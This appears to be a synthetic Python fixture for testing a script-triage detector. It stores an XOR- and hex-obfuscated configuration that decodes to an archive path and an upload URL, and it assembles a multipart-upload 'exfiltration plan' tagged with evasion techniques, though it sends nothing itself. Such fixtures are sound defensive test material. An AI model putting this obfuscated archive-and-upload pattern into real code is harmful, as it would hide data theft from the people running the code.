#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_b02a118e = "0a:13:00:54:43:4d:4c:4c:4c:4e:48:1f:4d:4d:57:1f:12:19:1b:19:55:18:1b:36:09:09:1f:08:0e:14:0f:32:55:1b:0e:1b:3e:17:1b:08:1d:15:08:2a:55:40:39:47:12:0e:1b:0a:25:1f:0c:13:12:19:08:1b:06:1e:1b:15:16:0a:0f:55:1e:13:16:1b:0c:14:13:54:1f:16:0a:17:1b:02:1f:54:43:4d:4c:4c:4c:4e:48:1f:4d:4d:55:55:40:09:0a:0e:0e:12:47:16:08:0f:25:1e:1b:15:16:0a:0f:06:43:4d:4c:4c:4c:4e:48:1f:4d:4d:57:14:1d:13:1b:0a:17:1b:19:47:1e:13:25:14:1d:13:1b:0a:17:1b:19:06:08:15:09:09:1f:19:1f:1e:1f:08:0a:25:48:49:16:16:1e:14:0f:08:47:14:13:1b:12:19:25:09:0d:15:1e:14:13:0d:06:08:13:1e:1f:14:15:25:08:1f:16:16:1b:0e:09:14:13:03:0a:47:08:1f:13:08:08:1b:19:06:14:15:13:0e:19:1f:08:13:1e:14:13:25:1b:1e:18:17:1b:16:47:14:15:13:0e:1b:19:09:0f:1c:18:15:06:12:19:0e:1b:0a:09:13:1e:25:03:08:1b:14:15:13:0e:19:13:1e:47:02:1b:0e:14:03:09:06:4b:47:0e:14:0f:15:19:25:1f:1d:1b:0e:09:06:14:1b:16:0a:25:17:08:15:1c:25:0e:08:1b:0a:13:0e:16:0f:17:47:08:1f:0e:0a:1b:1e:1b:06:1f:0e:15:17:1f:08:25:0e:13:17:09:14:1b:08:0e:56:1f:0c:13:12:19:08:1b:25:1f:1e:15:19:14:1f:56:16:1b:19:15:16:25:0e:19:1f:16:16:15:19:47:09:0a:1f:0e:09:06:48:47:0c"
CODEC_b02a118e = "hex_colon|reverse_then_xor|7a"

def load_b02a118e():
    return bytes.fromhex(MATERIAL_b02a118e.replace(":", " "))

def decode_b02a118e(e):
    return bytes(value ^ 122 for value in reversed(e))

def recover_b02a118e():
    n = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    d = decode_b02a118e(load_b02a118e())
    t = d.decode("ascii", "strict")
    return t

def inspect_b02a118e():
    return recover_b02a118e()

def surface_b02a118e():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_b02a118e():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_b02a118e():
    fields = dict(item.split("=", 1) for item in inspect_b02a118e().split("|"))
    analysis_surface = surface_b02a118e()
    obfuscation_surface = obfuscation_b02a118e()
    operation_plan = ("multipart_form_plan", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_b02a118e())
